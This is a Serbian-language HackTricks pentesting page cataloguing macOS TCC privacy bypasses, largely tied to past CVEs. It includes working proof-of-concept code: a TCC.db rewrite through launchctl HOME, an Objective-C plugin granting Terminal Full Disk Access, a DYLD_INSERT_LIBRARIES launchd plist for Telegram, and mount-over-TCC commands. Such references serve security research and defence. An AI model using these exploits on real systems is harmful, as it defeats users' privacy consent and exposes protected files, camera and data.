# Zaobilaženje macOS TCC-a

{{#include ../../../../../banners/hacktricks-training.md}}

## Prema funkcionalnosti

### Write Bypass

Ovo nije zaobilaženje, već samo način na koji TCC funkcioniše: **ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop-a korisnika, i dalje može da upisuje u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Prošireni atribut `com.apple.macl`** dodaje se novom **file-u** kako bi **creators app** dobila pristup za njegovo čitanje.

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prompt-a** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Napadač može **kreirati app-ove sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** fajlu i učiniti da zahtevaju pristup nekoj lokaciji zaštićenoj pomoću TCC-a. Korisnik će misliti da je legitimna aplikacija ta koja zahteva ovaj pristup.\
Štaviše, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu na njegovo mesto**, tako da, kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC permissions i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zatražila pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC možete pronaći u:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano, pristup preko **SSH-a je imao "Full Disk Access"**. Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (njegovo uklanjanje sa liste neće ukloniti te privilegije):

![TCC Request by arbitrary name - SSH Bypass: Podrazumevano, pristup preko SSH-a je imao "Full Disk Access". Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (njegovo uklanjanje...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere kako su neki **malware-i uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Imajte na umu da vam je sada, da biste mogli da omogućite SSH, potreban **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se fajlovima kako bi **određenoj aplikaciji omogućio dozvolu da ih čita.** Ovaj atribut se postavlja kada se fajl **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na fajl da bi ga otvorio pomoću **podrazumevane aplikacije**.

Zato bi korisnik mogao da **registruje malicious app** za rukovanje svim ekstenzijama i pozove Launch Services da **otvori** bilo koji fajl (čime će malicious file-u biti odobren pristup za čitanje).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC service-om, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** imali su ovaj entitlement i druge koji su to omogućavali.

Za više **informacija** o exploit-u za **dobijanje iCloud tokena** pomoću ovog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

App sa **`kTCCServiceAppleEvents`** permission-om moći će da **kontroliše druge App-ove**. To znači da bi mogao da **zloupotrebi permissions dodeljene drugim App-ovima**.

Za više informacija o Apple Scripts pogledajte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako App ima **Automation permission nad `iTerm`-om**, kao u ovom primeru gde **`Terminal`** ima pristup iTerm-u:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, koji nema FDA, može pozvati iTerm, koji ga ima, i koristiti ga za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Finder-a

Ili, ako App ima pristup preko Finder-a, može da izvrši skriptu kao što je ova:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Prema ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon** je koristio **`HOME`** **env** promenljivu za pristup TCC users bazi iz: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), i zato što se TCC daemon pokreće preko **`launchd`** unutar domena trenutnog korisnika, moguće je **kontrolisati sve env promenljive** koje mu se prosleđuju.\
Na taj način, **napadač može da postavi `$HOME` env** promenljivu u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da restartuje **TCC** daemon, a zatim direktno izmeni **TCC bazu** kako bi sebi dodelio **svaki dostupan TCC entitlement**, bez prikazivanja prompta krajnjem korisniku.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali kada se kreira beleška, ona se **kreira na nezaštićenoj lokaciji**. Zato je bilo moguće zatražiti od aplikacije Notes da kopira zaštićeni fajl u belešku (odnosno na nezaštićenu lokaciju), a zatim pristupiti tom fajlu:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binarni fajl `/usr/libexec/lsd`, zajedno sa bibliotekom `libsecurity_translocate`, imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao kreiranje **nullfs** mount-a, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, za pristup svakom fajlu.

Bilo je moguće dodati quarantine atribut na „Library“, pozvati **`com.apple.security.translocation`** XPC service, nakon čega bi Library bio mapiran na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je bilo moguće **pristupiti** svim dokumentima unutar Library-ja.

### CVE-2024-44131 - FileProvider symlink race

Aplikacije koje prosleđuju operacije nad fajlovima **privileged helper-u** (ovde **`fileproviderd`** / **`Files.app`**) kopiraju ili premeštaju stavke **u ime korisnika**, pa se kopiranje izvršava sa privilegijama helper-a, umesto sa privilegijama pozivaoca.

Jamf Threat Labs je pokazao da validacija symlink-a koja se obavlja pre operacije može biti predmet **race** uslova: umesto postavljanja symlink-a na **poslednju** komponentu putanje (koja se proverava), attacker menja **među-direktorijum** putanje **nakon što je kopiranje već počelo**. Privileged helper tada prati link pod kontrolom attacker-a i čita/upisuje lokacije zaštićene pomoću TCC-a **bez ikakvog prikazivanja prompt-a**.

Direktorijumi koji u svojoj putanji **nisu** zaštićeni nasumičnim UUID-om (na primer `~/Library/Mobile Documents/com~apple~CloudDocs`) predstavljaju najlakše mete, jer attacker može da predvidi punu putanju potrebnu za race.

> [!TIP]
> Ovo je generički obrazac koji treba tražiti: **svaki privileged process koji više puta razrešava putanju** (check-then-use ili `rename()`/`copyfile()` koji zasebno razrešavaju izvor i odredište) može biti predmet race uslova zamenom direktorijuma u sredini putanje. Samo `O_NOFOLLOW_ANY`, `openat()` nad već otvorenim direktorijumskim FD-om ili `realpath()` + ponovna validacija zaista zatvaraju ovaj vremenski prozor.

Više informacija u [**writeup-u kompanije Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` može biti build-ovan sa `SQLITE_ENABLE_SQLLOG`, što dodaje logging hook kojim upravljaju environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – za **svaku bazu podataka koja se otvori**, **kopija fajla baze podataka** i log SQL naredbi upisuju se u `path` (direktorijum mora već da postoji).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – kreira **novu kopiju svaki put** kada se DB otvori/attach-uje, umesto ponovnog korišćenja postojeće.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguje konekciju samo ako fajl `<database>-sqllog` postoji pored glavne DB.

Ako možeš da inject-uješ ovu promenljivu u process koji ima **FDA** i otvara SQLite baze podataka, on će bez problema **kopirati te zaštićene baze podataka** u direktorijum koji kontrolišeš. Pošto se naziv odredišnog fajla izvodi iz podataka pod kontrolom attacker-a, **symlink postavljen na odredištu** pretvara isti primitive u **arbitrary file write** sa privilegijama ciljnog process-a.

### **SQLITE_AUTO_TRACE**

Ako je environment variable **`SQLITE_AUTO_TRACE`** postavljen, biblioteka **`libsqlite3.dylib`** će početi da **loguje** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Pronalaženje upisa fajlova pokretanih env-var promenljivama

Prethodna dva unosa su primeri iste generičke tehnike i vredi potražiti još takvih slučajeva: **frameworks učitani u TCC-privileged aplikacije često izlažu debug/logging environment promenljive koje uzrokuju da proces kreira fajl na putanji koju kontroliše pozivalac**.

Workflow za njihovo pronalaženje:

1. Izaberite cilj sa FDA ili drugom korisnom TCC dozvolom (`Music`, `TV`, `Terminal`, MDM agents...) i navedite frameworks koje povezuje (`otool -L`, `vmmap`).
2. Pretražite te frameworks za `getenv` stringove: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Postavite kandidate za promenljive pomoću `launchctl setenv NAME /path/you/control`, pokrenite aplikaciju i pratite šta radi na filesystemu pomoću `fs_usage -w -f filesys <pid>` ili `sudo fs_usage | grep <path>`.
4. Ako proces **kreira ili preimenuje** fajl u vašem direktorijumu, imate write primitive: usmerite destinaciju na symlink (ili izazovite race intermediate direktorijuma, kao u prethodnom primeru CVE-2024-44131) da biste ga preusmerili na `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Ovo ograničavaju dve stvari. Prvo, **`DYLD_*` promenljive se ignorišu za hardened-runtime binarne fajlove** osim ako aplikacija ne sadrži entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("Boolean vrednost koja označava da li na aplikaciju mogu uticati dynamic linker environment promenljive, koje možete koristiti za inject koda u proces aplikacije") — pogledajte i [Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Drugo, Apple uklanja pojedinačne framework debug promenljive kada budu prijavljene, pa promenljiva koja je radila u jednom macOS izdanju često nestane u sledećem. Ako aplikacija nakon postavljanja neke promenljive nečujno odbija da se pokrene, tretirajte tu promenljivu kao već filtriranu.

Pogledajte [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) za ekvivalentan trik sa linker promenljivama.

### Apple Remote Desktop

Kao root mogli biste da omogućite ovaj servis, a **ARD agent bi imao full disk access**, što bi korisnik zatim mogao da zloupotrebi kako bi naterao agent da kopira novu **TCC user bazu**.

## Pomoću **NFSHomeDirectory**

TCC koristi bazu u korisnikovom HOME direktorijumu za kontrolu pristupa resursima specifičnim za korisnika, na lokaciji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Zato, ako korisnik uspe da restartuje TCC sa `$HOME` env promenljivom koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu u **/Library/Application Support/com.apple.TCC/TCC.db** i navede TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi podešavanje sačuvano u korisničkom profilu, u atributu **`NFSHomeDirectory`**, kao **vrednost `$HOME`**. Zato, ako kompromitujete aplikaciju koja ima dozvole za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), ovu opciju možete **weaponize** pomoću TCC bypass-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu korisnikovog **HOME** direktorijuma.

1. Preuzmite _csreq_ blob za ciljnu aplikaciju.
2. Postavite lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blob-om.
3. Eksportujte unos korisnika iz Directory Services pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite unos u Directory Services kako biste promenili korisnikov home direktorijum.
5. Importujte izmenjeni unos u Directory Services pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnikov _tccd_ i rebootujte proces.

Drugi POC je koristio **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, pri čemu je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene korisnikovog home direktorijuma pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection-om**.

Za više informacija pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Pomoću process injection-a

Postoje različite tehnike za inject koda unutar procesa i zloupotrebu njegovih TCC privilegija:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći process injection za bypass TCC-a odvija se pomoću **plugins-a (load library)**.\
Plugins su dodatni kod, obično u obliku libraries ili plist fajla, koji će **glavna aplikacija učitati** i izvršavati u njenom kontekstu. Zato, ako je glavna aplikacija imala pristup fajlovima ograničenim pomoću TCC-a (kroz dodeljene dozvole ili entitlements), **custom kod će takođe imati taj pristup**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala plugins sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.

Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodnog entitlement-a), kako bi bilo moguće **preuzeti kontrolu nad korisnikovom TCC bazom** i izvršiti TCC bypass.

Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binarni fajl **`/usr/sbin/coreaudiod`** imao je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.

Ovaj binarni fajl je omogućavao učitavanje **third-party plug-ins** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plugin i zloupotrebiti TCC dozvole** pomoću ovog POC-a:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Sistemske aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove plug-ins u proces** iz direktorijuma `/Library/CoreMediaIO/Plug-Ins/DAL` (nije ograničen putem SIP-a).

Dovoljno je samo sačuvati biblioteku sa uobičajenim **constructor**-om u tom direktorijumu da bi se izvršio **code injection**.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Firefox aplikacija je imala entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako ovo jednostavno exploit-ovati, pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućilo inject-ovanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće abuse-ovati ga kako bi se **dobio pristup njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Obratite pažnju na to da je za učitavanje library-ja pomoću env variable-a kreiran **custom plist**, a zatim je za njegovo pokretanje korišćen **`launchctl`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Putem open invocations

Moguće je pozvati **`open`** čak i kada ste u sandbox-u

### Terminal Scripts

Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički stručnjaci. Takođe je moguće pozvati **`.terminal`** scripts pomoću njega.

**`.terminal`** scripts su plist datoteke poput ove, sa komandom za izvršavanje u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija bi mogla da upiše terminal skriptu na lokaciju kao što je /tmp i pokrene je komandom poput:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Bilo koji korisnik** (čak i neprivilegovani) može da kreira i montira Time Machine snapshot i da pristupi **SVIM datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount preko TCC fajla

Čak i ako je TCC DB fajl zaštićen, bilo je moguće **mount-ovati preko direktorijuma** novi TCC.db fajl:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **full exploit** u [**originalnom writeup-u**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kao što je objašnjeno u [originalnom writeup-u](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebljavao `diskarbitrationd`.

Funkcija `DADiskMountWithArgumentsCommon` iz javnog `DiskArbitration` framework-a obavljala je security provere. Međutim, moguće je zaobići je direktnim pozivanjem `diskarbitrationd`, a samim tim koristiti `../` elemente u putanji i symlink-ove.

Ovo je napadaču omogućilo da izvrši proizvoljna mount-ovanja na bilo kojoj lokaciji, uključujući mount-ovanje preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` koji poseduje `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mount-ovanje na drugoj lokaciji, zaobilazeći TCC zaštite.

### Location Services

Postoji i treća TCC baza podataka u **`/var/db/locationd/clients.plist`**, koja označava klijente kojima je dozvoljen **pristup location services**.\
Folder **`/var/db/locationd/` nije bio zaštićen od DMG mount-ovanja**, pa je bilo moguće mount-ovati sopstveni plist.

## Pomoću startup aplikacija


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Pomoću grep-a

U nekoliko slučajeva fajlovi će čuvati osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama, što Apple smatra ranjivošću.

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali [**ranije je funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način korišćenjem [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
